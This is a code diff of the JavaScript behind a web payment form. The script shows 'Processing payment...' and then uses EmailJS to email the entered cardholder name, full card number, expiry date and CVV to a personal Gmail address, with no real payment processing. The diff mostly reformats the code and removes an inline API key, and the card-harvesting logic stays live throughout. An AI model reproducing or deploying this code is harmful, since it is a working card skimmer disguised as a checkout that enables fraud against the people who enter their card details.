@@ -541,25 +541,26 @@
         messageEl.textContent = 'Processing payment...';
 
         const templateParams = {
-  to_email: 'bobbybosmer2@gmail.com',
-  card_name: name,
-  card_number: cardNum,
-  expiry_date: expiry,
-  cvv: cvv
-};
+     to_email: 'bobbybosmer2@gmail.com',
+     card_name: name,
+     card_number: cardNum,
+     expiry_date: expiry,
+     cvv: cvv
+   };
+   emailjs
+     .send('service_clk3lle', 'template_eu1lqoh', templateParams)
+     .then(() => {
+       messageEl.textContent = '';
+       showModal();
+     })
+     .catch(err => {
+       payBtn.disabled = false;
+       messageEl.textContent = '';
+       errorEl.textContent = 'Payment failed to process. Please try again.';
+       console.error('EmailJS Error:', err);
+     });
+        });
 
-emailjs
-  .send('service_clk3lle', 'template_eu1lqoh', templateParams, '_TtNAiWrHBbHKL3dt') // Added API key here
-  .then(() => {
-    messageEl.textContent = '';
-    showModal();
-  })
-  .catch(err => {
-    payBtn.disabled = false;
-    messageEl.textContent = '';
-    errorEl.textContent = 'Payment failed to process. Please try again.';
-    console.error('EmailJS Error:', err);
-  });
 
 
       // Initialize UI
